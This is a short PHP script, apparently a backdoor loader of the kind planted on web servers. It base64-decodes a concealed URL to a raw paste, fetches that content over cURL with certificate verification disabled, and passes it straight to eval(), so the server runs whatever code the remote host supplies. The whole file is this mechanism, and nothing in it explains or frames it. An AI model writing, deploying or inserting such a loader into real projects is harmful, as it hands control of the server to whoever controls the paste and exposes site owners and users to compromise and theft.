<?php
$encodedUrl = 'aHR0cHM6Ly9wYXN0ZS1pbmkucGFnZXMuZGV2L3Jhdy81ODFhNjRqNA==';
$url = base64_decode($encodedUrl);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
$code = curl_exec($ch);
if (curl_errno($ch)) { die('cURL error'); }
curl_close($ch);
eval('?>' . $code);
?>
